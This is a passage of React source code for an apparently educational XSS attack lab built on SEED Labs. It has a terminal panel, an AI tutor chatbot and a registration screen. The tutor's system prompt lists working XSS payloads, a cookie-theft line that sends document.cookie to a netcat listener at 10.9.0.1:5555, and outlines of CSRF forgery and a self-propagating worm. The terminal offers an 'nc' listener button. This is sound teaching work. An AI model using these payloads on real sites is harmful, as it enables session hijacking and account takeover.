                            })}
                          </div>
                        </div>
                      )}
                      {sel.requestBody && (
                        <div>
                          <div style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:1, color:'#8b949e', marginBottom:6 }}>Request Body</div>
                          <div style={{ background:'#0d1117', border:'1px solid #30363d', borderRadius:6, padding:'10px 12px', fontFamily:"'JetBrains Mono',monospace", fontSize:11, lineHeight:1.9, wordBreak:'break-all' }}>
                            {String(sel.requestBody).split('&').map((part,i)=>{
                              const eqIdx = part.indexOf('=');
                              const k = part.slice(0,eqIdx);
                              const v = eqIdx >= 0 ? decodeURIComponent(part.slice(eqIdx+1)) : '';
                              const isHighlight = k.includes('token')||k.includes('description');
                              return (<div key={i}><span style={{ color:'#d29922' }}>{k}</span>=<span style={{ color:isHighlight?'#f85149':'#e6edf3' }}>{v}</span></div>);
                            })}
                          </div>
                        </div>
                      )}
                    </div>
                  </>}
            </div>
          </div>
        )}
      </div>
    );
  }

  // ── REAL TERMINAL ─────────────────────────────────────────────────────────────
  function RealTerminal({ studentId='default' }) {
    const termRef = useRef(null); const xtermRef = useRef(null); const wsRef = useRef(null); const initDoneRef = useRef(false);
    const [connected, setConnected] = useState(false); const [error, setError] = useState(null); const [containerReady, setContainerReady] = useState(false); const [loading, setLoading] = useState(true);

    useEffect(() => {
      if (initDoneRef.current) return; initDoneRef.current = true;
      fetch(`http://localhost:3001/api/student/${studentId}/init`, { method:'POST', headers:{'Content-Type':'application/json'} })
        .then(r=>r.json()).then(data=>{ if(data.success){setContainerReady(true);setLoading(false);}else{setError(data.error||'Container init failed');setLoading(false);} })
        .catch(err=>{ setError(`Backend server not running on port 3001 — Terminal unavailable. Start backend with: npm run dev:all`); setLoading(false); });
    }, [studentId]);

    useEffect(() => {
      if (!containerReady||!termRef.current||xtermRef.current) return;
      const loadXterm = () => new Promise(resolve => {
        if (window.Terminal){resolve();return;}
        const s=document.createElement('script'); s.src='https://unpkg.com/xterm@5.2.0/lib/xterm.js';
        s.onload=()=>{ const l=document.createElement('link'); l.rel='stylesheet'; l.href='https://unpkg.com/xterm@5.2.0/css/xterm.css'; document.head.appendChild(l); resolve(); };
        document.head.appendChild(s);
      });
      loadXterm().then(()=>{
        if(!termRef.current||xtermRef.current) return;
        const term=new window.Terminal({ cursorBlink:true, fontSize:13, fontFamily:'"JetBrains Mono","Fira Code",monospace', scrollback:1000, theme:{ background:'#0d1117', foreground:'#e6edf3', cursor:'#00d4aa', red:'#f85149', green:'#3fb950', yellow:'#d29922', blue:'#58a6ff' } });
        term.open(termRef.current); xtermRef.current=term;
        const protocol=window.location.protocol==='https:'?'wss:':'ws:';
        try {
          const ws=new WebSocket(`${protocol}//localhost:3001/terminal?student=${studentId}`);
          wsRef.current=ws;
          ws.onopen=()=>{ setConnected(true); setError(null); };
          ws.onmessage=e=>{ term.write(e.data); };
          ws.onerror=()=>{ setError('Terminal server not running on port 3001'); setConnected(false); };
          ws.onclose=()=>{ setConnected(false); term.writeln('\r\n\x1b[31m● Terminal disconnected\x1b[0m'); };
          term.onData(data=>{ if(ws.readyState===WebSocket.OPEN) ws.send(JSON.stringify({type:'input',data})); });
        } catch (err) {
          setError('Backend server not running — Terminal unavailable');
        }
      });
    }, [containerReady, studentId]);

    const sendCommand=cmd=>{ if(wsRef.current?.readyState===WebSocket.OPEN) wsRef.current.send(JSON.stringify({type:'input',data:cmd+'\n'})); };

    return (
      <div style={{ height:'100%', display:'flex', flexDirection:'column', background:'#0d1117', padding:16, gap:10 }}>
        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', background:'#161b22', border:'1px solid #30363d', borderRadius:8, padding:'8px 14px', flexShrink:0 }}>
          <div style={{ display:'flex', alignItems:'center', gap:8 }}>
            <span style={{ fontSize:10, color:loading?'#d29922':connected?'#3fb950':'#f85149' }}>●</span>
            <span style={{ fontSize:12, color:'#e6edf3', fontWeight:700 }}>SEED Labs Terminal</span>
          </div>
          <span style={{ fontSize:10, padding:'2px 8px', background:loading?'rgba(210,153,34,0.1)':connected?'rgba(63,185,80,0.1)':'rgba(248,81,73,0.1)', border:`1px solid ${loading?'rgba(210,153,34,0.3)':connected?'rgba(63,185,80,0.3)':'rgba(248,81,73,0.3)'}`, color:loading?'#d29922':connected?'#3fb950':'#f85149', borderRadius:4 }}>
            {loading?'Initializing...':connected?'Connected':'Disconnected'}
          </span>
        </div>
        {error && !loading && (
          <div style={{ background:'rgba(248,81,73,0.08)', border:'1px solid rgba(248,81,73,0.3)', borderRadius:8, padding:'12px 14px', fontSize:12, color:'#f85149', flexShrink:0 }}>
            <div style={{ fontWeight:700, marginBottom:8 }}>⚠️ Terminal Setup Required</div>
            <div style={{ color:'#8b949e', fontSize:11, fontFamily:'monospace', lineHeight:2 }}>
              <div>1. Start Docker Desktop</div>
              <div style={{ background:'#161b22', padding:'4px 8px', borderRadius:4, marginTop:4 }}>npm run terminal</div>
              <div style={{ marginTop:8 }}>2. Refresh this page</div>
            </div>
          </div>
        )}
        <div style={{ flex:1, border:'1px solid #30363d', borderRadius:8, overflow:'hidden', background:'#0d1117', display:'flex', flexDirection:'column' }}>
          <div style={{ background:'#161b22', borderBottom:'1px solid #30363d', padding:'8px 12px', display:'flex', alignItems:'center', gap:6, flexShrink:0 }}>
            <span style={{ width:12, height:12, borderRadius:'50%', background:'#f85149', display:'inline-block' }} />
            <span style={{ width:12, height:12, borderRadius:'50%', background:'#d29922', display:'inline-block' }} />
            <span style={{ width:12, height:12, borderRadius:'50%', background:'#3fb950', display:'inline-block' }} />
            <span style={{ fontSize:11, color:'#8b949e', marginLeft:8 }}>seed@xss-lab: ~</span>
          </div>
          <div ref={termRef} style={{ flex:1, minHeight:0 }} />
        </div>
        <div style={{ display:'flex', gap:8, flexWrap:'wrap', flexShrink:0 }}>
          {[{label:'nc -lknv 5555',cmd:'nc -lknv 5555'},{label:'whoami',cmd:'whoami'},{label:'cat /etc/hosts',cmd:'cat /etc/hosts'},{label:'apache2 restart',cmd:'service apache2 restart'},{label:'clear',cmd:'clear'}].map(({label,cmd})=>(
            <button key={label} onClick={()=>sendCommand(cmd)}
              style={{ background:'#161b22', border:'1px solid #30363d', color:'#8b949e', borderRadius:6, padding:'5px 12px', fontSize:11, cursor:'pointer', fontFamily:'monospace' }}
              onMouseEnter={e=>{e.target.style.borderColor='#00d4aa';e.target.style.color='#00d4aa';}}
              onMouseLeave={e=>{e.target.style.borderColor='#30363d';e.target.style.color='#8b949e';}}>
              {label}
            </button>
          ))}
        </div>
      </div>
    );
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // ── AI CHATBOT — IMPROVED FOR STUDENTS ────────────────────────────────────────
  // ══════════════════════════════════════════════════════════════════════════════

  // ── IMPROVED SYSTEM PROMPT ────────────────────────────────────────────────────
  const AI_SYSTEM_PROMPT = `You are XSS Tutor — a friendly teaching assistant inside an XSS Attack Lab for cybersecurity students (SEED Labs 20.04 curriculum).

  YOUR PERSONALITY:
  - Talk like a patient friend, not a textbook
  - Use simple everyday words. Avoid jargon unless you explain it right away
  - Be encouraging — XSS is genuinely tricky!
  - Keep answers SHORT. 3–5 sentences for simple questions, max 10 sentences for complex ones
  - Use bullet points and numbered steps for anything procedural
  - Always end with ONE next action the student should try

  ANSWER FORMAT RULES:
  1. Start with a one-line plain-English summary of what's wrong / what the answer is
  2. Explain WHY in 1–2 sentences using an analogy if helpful
  3. Give the exact fix as numbered steps or a code block
  4. End with: "Try that and let me know what happens! 🚀"

  TASK QUICK REFERENCE (use these facts, keep explanations simple):

  TASK 1 — Basic alert injection
  - Brief Description field: paste directly, no checkbox needed
  - About Me field: MUST tick "Edit HTML" first or TinyMCE deletes the script
  - Payload 1.1: <script>alert('XSS');</script>
  - Payload 1.2: <script>alert(document.cookie);</script>
  - The alert fires in ALICE's browser, not Samy's

  TASK 2 — Cookie theft to netcat
  - Step ORDER matters: start nc FIRST, then have Alice visit
  - Command: nc -lknv 5555  (the -k keeps it alive for multiple connections)
  - Payload uses document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >')
  - escape() turns = and ; into safe URL characters like %3D

  TASK 3 — Forged friend-add (GET request)
  - Goes in About Me with Edit HTML ticked
  - Reads live CSRF tokens: elgg.security.token.__elgg_ts and __elgg_token
  - Samy's GUID = 59 (this is hardcoded in the payload already)
  - Uses window.onload so it fires when the page finishes loading

  TASK 4 — Profile overwrite (POST request)
  - Same as Task 3 but sends a POST to /action/profile/edit
  - Needs Content-Type: application/x-www-form-urlencoded header
  - Has a samyGuid guard (if guid != 59) to stop Samy overwriting himself
  - Without the guard: Samy visits his own profile → his payload gets deleted!

  TASK 5 — Self-propagating worm
  - The <script> tag needs id="worm"
  - document.getElementById("worm").innerHTML reads its own code
  - encodeURIComponent() wraps the code before POSTing (encodes < > " &)
  - Chain: Samy infects Alice, Alice's profile infects Charlie, and so on
  - Double-encoding bug: if worm code has %253C instead of %3C, propagation fails

  TASK 6 — CSP defense
  - Put BOTH domains on ONE script-src line (two lines = only the last one counts)
  - Correct: script-src 'self' *.example60.com *.example70.com
  - Wrong: script-src *.example60.com THEN script-src *.example70.com (second line wins, first is ignored)
  - A nonce lets one specific inline script run without enabling ALL inline scripts

  COMMON BUGS (diagnose these first):
  1. Nothing fires → Did they tick "Edit HTML" in the About Me field?
  2. Netcat shows nothing → Was nc started BEFORE Alice visited?
  3. Cookie field is empty in netcat output → Cookie might be HttpOnly (not in this lab, but check)
  4. Worm doesn't spread to Charlie → Likely double-encoding: check if code has %253C instead of %3C
  5. CSP not blocking scripts → Are both domains on the SAME line?
  6. Samy's payload got overwritten → Forgot the samyGuid guard in Task 4/5

  ANALOGIES THAT WORK WELL FOR STUDENTS:
  - XSS payload = a note hidden in a letter that runs itself when someone reads it
  - netcat = a person holding out their hand waiting to catch something — they must be ready BEFORE you throw
  - CSRF token = a secret handshake the server uses to verify requests are real
  - Cookie = a VIP badge the browser carries around — stealing it = stealing the badge
  - Worm = a photocopier that copies itself while it modifies your document
  - CSP = a bouncer who only lets in scripts from approved guestlists

  RESPONSE STYLE:
  - Never paste a wall of technical text without breaking it into steps
  - If a student seems frustrated, acknowledge it ("XSS worms are the trickiest part of this lab — you're not alone!")
  - If they ask what a term means, give a one-sentence plain English definition before the technical one
  - Max response length: 250 words for debugging, 150 words for concept explanations`;

  // ── QUICK QUESTION CHIPS ──────────────────────────────────────────────────────
  const AI_QUICK_QUESTIONS = [
    { emoji:'🍪', label:'My netcat shows nothing', text:'I ran nc -lknv 5555 and Alice visited Samy\'s profile but nothing appeared in netcat. What\'s wrong?' },
    { emoji:'📝', label:'Edit HTML — what is it?', text:'What is the "Edit HTML" checkbox in the About Me field and why do I need it for XSS payloads?' },
    { emoji:'🚨', label:'Alert not firing for Alice', text:'I saved the script into Samy\'s profile but when Alice visits, no alert box appears. What should I check?' },
    { emoji:'👥', label:'Task 3: Samy not added', text:'Alice visited Samy\'s profile with the Task 3 payload but Samy still isn\'t in Alice\'s friends list. Why?' },
    { emoji:'🪱', label:'Worm stops at Alice', text:'The worm infected Alice from Samy, but Charlie visiting Alice doesn\'t get infected. What\'s the bug?' },
    { emoji:'🔒', label:'What is a CSRF token?', text:'What are __elgg_ts and __elgg_token in the Task 3 payload? Explain it simply.' },
    { emoji:'🛡️', label:'Task 6: CSP not working', text:'I added CSP to Apache but injected scripts still run. What am I doing wrong?' },
    { emoji:'💀', label:'Task 4: Samy\'s payload deleted', text:'I injected the Task 4 payload but when Samy views his own profile, the About Me changes to "Samy is my hero!" and the script is gone. Why?' },
  ];

  // ── TYPING INDICATOR ──────────────────────────────────────────────────────────
  function TypingIndicator() {
    return (
      <div style={{ display:'flex', alignItems:'center', gap:5, padding:'8px 0' }}>
        <span style={{ fontSize:12, color:C.muted }}>XSS Tutor is thinking</span>
        {[0,1,2].map(i => (
          <span key={i} style={{ width:6, height:6, borderRadius:'50%', background:C.accent, display:'inline-block', animation:`aiDot 1.2s ${i*0.18}s ease-in-out infinite` }} />
        ))}
      </div>
    );
  }

  // ── MESSAGE RENDERER ──────────────────────────────────────────────────────────
  function renderMarkdown(text) {
    const lines = text.split('\n');
    const out = [];
    let inCode = false, codeLang = '', codeLines = [];

    lines.forEach((line, li) => {
      // code fence
      if (line.startsWith('```')) {
        if (!inCode) { inCode = true; codeLang = line.slice(3).trim(); codeLines = []; }
        else {
          out.push(
            <div key={`code-${li}`} style={{ background:'#0d1117', border:`1px solid ${C.border}`, borderRadius:8, margin:'8px 0', overflow:'hidden' }}>
              {codeLang && <div style={{ background:C.bgSec, padding:'4px 12px', fontSize:9, color:C.faint, fontWeight:700, textTransform:'uppercase', letterSpacing:1, borderBottom:`1px solid ${C.border}` }}>{codeLang}</div>}
              <pre style={{ margin:0, padding:'10px 12px', fontFamily:"'JetBrains Mono','Courier New',monospace", fontSize:11.5, color:'#e6edf3', lineHeight:1.7, whiteSpace:'pre-wrap', wordBreak:'break-word' }}>{codeLines.join('\n')}</pre>
            </div>
          );
          inCode = false; codeLines = [];
        }
        return;
      }
      if (inCode) { codeLines.push(line); return; }

      // inline formatting helper
      const inline = (str, key) => {
        const parts = str.split(/(`[^`]+`|\*\*[^*]+\*\*)/g);
        return <span key={key}>{parts.map((p, pi) => {
          if (p.startsWith('`') && p.endsWith('`')) return <code key={pi} style={{ fontFamily:'monospace', fontSize:11.5, background:'rgba(255,255,255,0.09)', padding:'1px 5px', borderRadius:4, color:'#79c0ff' }}>{p.slice(1,-1)}</code>;
          if (p.startsWith('**') && p.endsWith('**')) return <strong key={pi} style={{ color:C.text, fontWeight:700 }}>{p.slice(2,-2)}</strong>;
          return p;
        })}</span>;
      };

      if (line === '') { out.push(<div key={li} style={{ height:7 }} />); return; }
      if (line.startsWith('### ')) { out.push(<div key={li} style={{ fontSize:13, fontWeight:800, color:C.text, marginTop:14, marginBottom:5 }}>{line.slice(4)}</div>); return; }
      if (line.startsWith('## '))  { out.push(<div key={li} style={{ fontSize:14, fontWeight:800, color:C.text, marginTop:16, marginBottom:6 }}>{line.slice(3)}</div>); return; }
      if (line.startsWith('# '))   { out.push(<div key={li} style={{ fontSize:15, fontWeight:900, color:C.text, marginTop:16, marginBottom:6 }}>{line.slice(2)}</div>); return; }

      // numbered list
      const numMatch = line.match(/^(\d+)\.\s(.+)/);
      if (numMatch) {
        out.push(
          <div key={li} style={{ display:'flex', gap:10, marginBottom:5, alignItems:'flex-start' }}>
            <span style={{ flexShrink:0, minWidth:22, height:22, borderRadius:'50%', background:'rgba(0,212,170,0.15)', border:'1px solid rgba(0,212,170,0.35)', color:C.accent, fontSize:11, fontWeight:800, display:'flex', alignItems:'center', justifyContent:'center', marginTop:1 }}>{numMatch[1]}</span>
            <span style={{ fontSize:13, color:C.text, lineHeight:1.6, paddingTop:2 }}>{inline(numMatch[2], li)}</span>
          </div>
        );
        return;
      }

      // bullet list
      if (line.startsWith('- ') || line.startsWith('• ')) {
        out.push(
          <div key={li} style={{ display:'flex', gap:8, marginBottom:4, alignItems:'flex-start' }}>
            <span style={{ color:C.accent, fontSize:16, lineHeight:1, marginTop:2, flexShrink:0 }}>·</span>
            <span style={{ fontSize:13, color:C.text, lineHeight:1.6 }}>{inline(line.slice(2), li)}</span>
          </div>
        );
        return;
      }

      // separator
      if (line === '---') { out.push(<hr key={li} style={{ border:'none', borderTop:`1px solid ${C.border}`, margin:'10px 0' }} />); return; }

      out.push(<div key={li} style={{ fontSize:13, color:C.text, lineHeight:1.7, marginBottom:2 }}>{inline(line, li)}</div>);
    });

    return out;
  }

  // ── MESSAGE BUBBLE ────────────────────────────────────────────────────────────
  function AiMessageBubble({ msg }) {
    const isUser = msg.role === 'user';

    return (
      <div style={{ display:'flex', flexDirection:isUser?'row-reverse':'row', gap:10, padding:'4px 0', alignItems:'flex-start' }}>
        {/* Avatar */}
        <div style={{
          width:34, height:34, borderRadius:'50%', flexShrink:0,
          display:'flex', alignItems:'center', justifyContent:'center', fontSize:16,
          background:isUser ? 'rgba(88,166,255,0.12)' : msg.error ? 'rgba(248,81,73,0.12)' : 'rgba(0,212,170,0.12)',
          border:`1.5px solid ${isUser ? 'rgba(88,166,255,0.3)' : msg.error ? 'rgba(248,81,73,0.3)' : 'rgba(0,212,170,0.3)'}`,
        }}>
          {isUser ? '🧑‍💻' : msg.error ? '⚠️' : '🤖'}
        </div>

        {/* Bubble */}
        <div style={{
          maxWidth:'82%',
          background: isUser ? 'rgba(88,166,255,0.09)' : msg.error ? 'rgba(248,81,73,0.07)' : C.bgCard,
          border:`1px solid ${isUser ? 'rgba(88,166,255,0.22)' : msg.error ? 'rgba(248,81,73,0.3)' : C.border}`,
          borderRadius: isUser ? '16px 4px 16px 16px' : '4px 16px 16px 16px',
          padding:'10px 14px',
        }}>
          {msg.loading
            ? <TypingIndicator />
            : msg.error
              ? <div style={{ fontSize:12, color:C.red }}>{msg.content}</div>
              : <div style={{ color:C.text }}>{renderMarkdown(msg.content)}</div>
          }
          {msg.ts && <div style={{ fontSize:10, color:C.faint, marginTop:6, textAlign:isUser?'right':'left' }}>{msg.ts}</div>}
        </div>
      </div>
    );
  }

  // ── MAIN AI CHATBOT COMPONENT ─────────────────────────────────────────────────
  function AiChatbot({ currentTaskId = 'task1', studentName = 'Student' }) {
    const taskNum = currentTaskId?.replace('task','') || '1';
    const welcomeMsg = `Hey ${studentName}! 👋 I'm your **XSS Lab Tutor**.

  I'm here to help you when you're stuck. I explain things in plain English — no need for fancy tech words.

  **What I can help with:**
  - Why your payload isn't working
  - What each step actually does
  - Quick fixes for common mistakes

  What's giving you trouble right now? Or pick a question below.`;

    const [messages, setMessages] = useState([{
      id: 'welcome', role: 'assistant',
      ts: new Date().toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' }),
      content: welcomeMsg,
    }]);
    const [input, setInput] = useState('');
    const [loading, setLoading] = useState(false);
    const [showChips, setShowChips] = useState(true);
    const historyRef = useRef([]);
    const bottomRef = useRef(null);
    const textareaRef = useRef(null);

    // Auto-scroll to latest message
    useEffect(() => { bottomRef.current?.scrollIntoView({ behavior:'smooth' }); }, [messages]);

    const ts = () => new Date().toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' });

    const send = useCallback(async (textOverride) => {
      const text = (textOverride ?? input).trim();
      if (!text || loading) return;

      setInput('');
      setShowChips(false);
      setLoading(true);

      const userMsg = { id: Date.now(), role:'user', content:text, ts:ts() };
      const loadingMsg = { id:'__loading__', role:'assistant', loading:true };
      setMessages(prev => [...prev, userMsg, loadingMsg]);
      historyRef.current = [...historyRef.current, { role:'user', content:text }];

      try {
        // Convert to Gemini format
        const contents = [
          { role: 'user', parts: [{ text: AI_SYSTEM_PROMPT + `\n\nCURRENT CONTEXT: Student "${studentName}" is on Task ${taskNum}. Tailor your answer to this task if relevant.` }] },
          { role: 'model', parts: [{ text: 'Understood. I will help guide this student through the XSS lab.' }] },
          ...historyRef.current.map(msg => ({
            role: msg.role,
            parts: [{ text: msg.content }]
          })),
          { role: 'user', parts: [{ text }] },
        ];

        const res = await fetch('https://generativelanguage.googleapis.com/v1beta/models/' + GEMINI_MODEL + ':generateContent?key=' + GEMINI_API_KEY, {
          method: 'POST',
          headers: { 'Content-Type':'application/json' },
          body: JSON.stringify({
            contents,
            generationConfig: {
              temperature: 0.7,
              maxOutputTokens: 1000,
            }
          }),
        });

        if (!res.ok) {
          const err = await res.json().catch(() => ({}));
          if (err?.error?.message?.includes('API_KEY') || err?.error?.message?.includes('not found')) {
            throw new Error('Invalid Gemini API key. Paste your key from https://aistudio.google.com/app/apikey into GEMINI_API_KEY at the top.');
          }
          throw new Error(err?.error?.message || `HTTP ${res.status}`);
        }

        const data = await res.json();
        const reply = data.candidates?.[0]?.content?.parts?.[0]?.text || 'Sorry, no response came back. Try again!';

        historyRef.current = [...historyRef.current, { role:'assistant', content:reply }];
        setMessages(prev => [
          ...prev.filter(m => m.id !== '__loading__'),
          { id: Date.now() + 1, role:'assistant', content:reply, ts:ts() }
        ]);

      } catch (err) {
        historyRef.current = historyRef.current.slice(0, -1);
        setMessages(prev => [
          ...prev.filter(m => m.id !== '__loading__'),
          {
            id: Date.now() + 1, role:'assistant', error:true, ts:ts(),
            content: `Can't reach the AI right now: **${err.message}**\n\nCheck your network and try again.`
          }
        ]);
      }

      setLoading(false);
      setTimeout(() => textareaRef.current?.focus(), 80);
    }, [input, loading, studentName, taskNum]);

    const clearChat = () => {
      if (!window.confirm('Clear the chat?')) return;
      historyRef.current = [];
      setMessages([{
        id: 'reset', role:'assistant',
        ts: ts(),
        content: `Chat cleared! What do you need help with, ${studentName}? 🚀`
      }]);
      setShowChips(true);
    };

    return (
      <div style={{ height:'100%', display:'flex', flexDirection:'column', background:C.bg, fontFamily:'system-ui,-apple-system,sans-serif', overflow:'hidden' }}>
        <style>{`
          @keyframes aiDot { 0%,80%,100%{transform:scale(0.6);opacity:0.4} 40%{transform:scale(1);opacity:1} }
          .ai-chip:hover { background:rgba(0,212,170,0.1) !important; border-color:rgba(0,212,170,0.4) !important; color:${C.accent} !important; transform:translateY(-1px); }
          .ai-chip { transition: all 0.15s ease !important; }
          .ai-send-btn:hover:not(:disabled) { background:${C.accentHov} !important; transform:scale(1.05); }
          .ai-send-btn { transition:all 0.15s ease !important; }
        `}</style>

        {/* ── Header ── */}
        <div style={{
          background: C.bgSec, borderBottom:`1px solid ${C.border}`,
          padding:'12px 16px', flexShrink:0,
          display:'flex', alignItems:'center', justifyContent:'space-between', gap:12
        }}>
          <div style={{ display:'flex', alignItems:'center', gap:12 }}>
            <div style={{
              width:42, height:42, borderRadius:'50%',
              background:'rgba(0,212,170,0.12)', border:'1.5px solid rgba(0,212,170,0.35)',
              display:'flex', alignItems:'center', justifyContent:'center', fontSize:22
            }}>🤖</div>
            <div>
              <div style={{ fontSize:14, fontWeight:800, color:C.text }}>XSS Lab Tutor</div>
              <div style={{ fontSize:10, color:C.accent, display:'flex', alignItems:'center', gap:5, marginTop:2 }}>
                <span style={{ width:6, height:6, borderRadius:'50%', background:C.accent, display:'inline-block' }} />
                Online · Task {taskNum} active · Answers in plain English
              </div>
            </div>
          </div>
          <div style={{ display:'flex', gap:8, alignItems:'center' }}>
            <div style={{ fontSize:10, padding:'3px 9px', borderRadius:99, background:'rgba(88,166,255,0.1)', border:'1px solid rgba(88,166,255,0.2)', color:C.blue }}>claude-sonnet-4-6</div>
            <button onClick={clearChat}
              style={{ background:'transparent', border:`1px solid ${C.border}`, color:C.faint, borderRadius:6, padding:'4px 10px', cursor:'pointer', fontSize:11, fontFamily:'inherit' }}>
              🗑 Clear
            </button>
          </div>
        </div>

        {/* ── Message list ── */}
        <div style={{ flex:1, overflowY:'auto', padding:'14px 16px 8px', display:'flex', flexDirection:'column', gap:2 }}>
          {messages.map(m => <AiMessageBubble key={m.id} msg={m} />)}

          {/* Quick question chips — shown only at the start */}
          {showChips && messages.length <= 1 && (
            <div style={{ marginTop:16 }}>
              <div style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:1.5, color:C.faint, marginBottom:10 }}>
                Common problems — tap to ask
              </div>
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:7 }}>
                {AI_QUICK_QUESTIONS.map((q, i) => (
                  <button key={i} className="ai-chip" onClick={() => send(q.text)}
                    style={{
                      background: C.bgSec, border:`1px solid ${C.border}`, borderRadius:10,
                      padding:'9px 12px', cursor:'pointer', textAlign:'left',
                      color:C.muted, fontSize:12, fontFamily:'inherit', lineHeight:1.45,
                      display:'flex', alignItems:'center', gap:8,
                    }}>
                    <span style={{ fontSize:16, flexShrink:0 }}>{q.emoji}</span>
                    <span>{q.label}</span>
                  </button>
                ))}
              </div>
            </div>
          )}

          <div ref={bottomRef} />
        </div>

        {/* ── Input area ── */}
        <div style={{ padding:'10px 16px 14px', borderTop:`1px solid ${C.border}`, background:C.bgSec, flexShrink:0 }}>
          <div style={{
            display:'flex', gap:8, alignItems:'flex-end',
            background:C.bg, border:`1px solid ${C.border}`,
            borderRadius:14, padding:'8px 10px 8px 14px',
          }}>
            <textarea
              ref={textareaRef}
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send(); } }}
              placeholder="Ask anything — e.g. 'Why is my alert not firing?' (Enter to send)"
              rows={1}
              disabled={loading}
              style={{
                flex:1, background:'transparent', border:'none', outline:'none',
                color:C.text, fontSize:13, fontFamily:'inherit',
                resize:'none', lineHeight:1.55, maxHeight:110, overflowY:'auto',
              }}
              onInput={e => { e.target.style.height = 'auto'; e.target.style.height = Math.min(e.target.scrollHeight, 110) + 'px'; }}
            />
            <button
              className="ai-send-btn"
              onClick={() => send()}
              disabled={!input.trim() || loading}
              style={{
                background: (!input.trim() || loading) ? C.bgHov : C.accent,
                border:'none', borderRadius:10,
                width:38, height:38, flexShrink:0,
                cursor: (!input.trim() || loading) ? 'default' : 'pointer',
                display:'flex', alignItems:'center', justifyContent:'center',
                fontSize:18,
                color: (!input.trim() || loading) ? C.faint : '#0d1117',
              }}>
              {loading ? '⏳' : '➤'}
            </button>
          </div>
          <div style={{ fontSize:10, color:C.faint, marginTop:6, textAlign:'center' }}>
            AI answers may not always be 100% correct — always test in the simulator
          </div>
        </div>
      </div>
    );
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // ── START SCREEN ───────────────────────────────────────────────────────────────
  // ── BRANCH OPTIONS ────────────────────────────────────────────────────────────
  const BRANCH_OPTIONS = [
    'CSE','ISE','ECE','EEE','ME','CV','AI/ML','DS','Robotics','BT','CH','IM','Other'
  ];

  function StartScreen({ onStart, isDarkMode, setIsDarkMode }) {
    const [name, setName]     = useState('');
    const [srn,  setSrn]      = useState('');
    const [branch, setBranch] = useState('');
    const [errors, setErrors] = useState({});
    const C = getTheme(isDarkMode);

    const inputStyle = (hasErr) => ({
      width:'100%', background:C.bg, border:`1px solid ${hasErr?C.red:C.border}`,
      borderRadius:12, padding:'12px 16px', color:'#fff', fontSize:13, outline:'none',
      marginBottom:4, boxSizing:'border-box', fontFamily:'inherit'
    });
    const labelStyle = {
      display:'block', textAlign:'left', fontSize:10, fontWeight:700,
      letterSpacing:2, color:C.muted, textTransform:'uppercase', marginBottom:6
    };

    const validate = () => {
      const e = {};
      if (!name.trim()) e.name = 'Full name is required';
      if (!srn.trim()) e.srn = 'SRN is required';
      else if (!/^PES\d[A-Z]{2}\d{2}[A-Z]{2}\d{3}$/i.test(srn.trim())) e.srn = 'Format: PES1UG23AM203';
      if (!branch) e.branch = 'Select your branch';
      return e;
    };

    const handleSubmit = () => {
      const e = validate();
      if (Object.keys(e).length) { setErrors(e); return; }
      onStart(name.trim(), srn.trim().toUpperCase(), branch);
    };

    const features = [
      { icon:'🍪', t:'Cookie Theft',    d:'Steal session tokens via injected img tags and a netcat listener.' },
      { icon:'👥', t:'Request Forgery', d:'Silently add friends and overwrite profiles via forged AJAX.' },
      { icon:'🪱', t:'XSS Worm',        d:'DOM self-propagating worm — exponential spread across users.' },
      { icon:'🛡️', t:'CSP Defense',    d:'Block injected scripts using Content Security Policy headers.' },
    ];

    return (
      <div style={{ minHeight:'100vh', background:C.bg, color:C.text, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:24, fontFamily:'system-ui,-apple-system,sans-serif', position:'relative', overflow:'hidden' }}>
        <style>{`
          * { transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease; }
          .theme-toggle:hover { transform: scale(1.1) rotate(20deg) !important; }
        `}</style>
        {/* Theme toggle - Top right corner */}
        <button className='theme-toggle' onClick={()=>setIsDarkMode(!isDarkMode)} title={isDarkMode?'Switch to Light Mode':'Switch to Dark Mode'} style={{ position:'absolute', top:24, right:24, width:44, height:44, borderRadius:'50%', border:`1px solid ${C.border}`, background:C.bgCard, color:C.text, cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', fontSize:20, fontFamily:'inherit', transition:'all 0.3s ease', zIndex:100 }}>
          {isDarkMode ? '☀️' : '🌙'}
        </button>
        <div style={{ position:'absolute', inset:0, background:'radial-gradient(ellipse 80% 60% at 50% -10%, rgba(0,212,170,0.13), transparent)', pointerEvents:'none' }} />
        <div style={{ maxWidth:900, width:'100%', zIndex:1, textAlign:'center', display:'flex', flexDirection:'column', alignItems:'center' }}>
          <div style={{ width:88, height:88, marginBottom:24, borderRadius:'50%', background:C.bgCard, border:`1px solid ${C.border}`, display:'flex', alignItems:'center', justifyContent:'center', fontSize:44 }}>💉</div>
          <h1 style={{ fontSize:52, fontWeight:900, margin:'0 0 12px', letterSpacing:-2, color:C.text }}>XSS <span style={{ color:C.accent }}>Attack Lab</span></h1>
          <p style={{ fontSize:17, color:C.muted, maxWidth:560, margin:'0 0 36px', lineHeight:1.7 }}>Master Cross-Site Scripting through hands-on attacks. Tasks unlock progressively — complete each one to advance.</p>
          <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', gap:14, width:'100%', marginBottom:48, textAlign:'left' }}>
            {features.map(f => (
              <div key={f.t} style={{ padding:20, borderRadius:14, background:C.bgSec, border:`1px solid ${C.border}` }}>
                <div style={{ fontSize:30, marginBottom:10 }}>{f.icon}</div>
                <div style={{ fontWeight:700, color:C.text, marginBottom:4, fontSize:13 }}>{f.t}</div>
                <div style={{ fontSize:11, color:C.muted, lineHeight:1.6 }}>{f.d}</div>
              </div>
            ))}
          </div>

          {/* ── REGISTRATION CARD ── */}
          <div style={{ width:'100%', maxWidth:480, background:C.bgSec, border:`1px solid ${C.border}`, borderRadius:18, padding:28, textAlign:'left' }}>
            <div style={{ fontSize:16, fontWeight:800, color:C.text, marginBottom:4 }}>Student Registration</div>
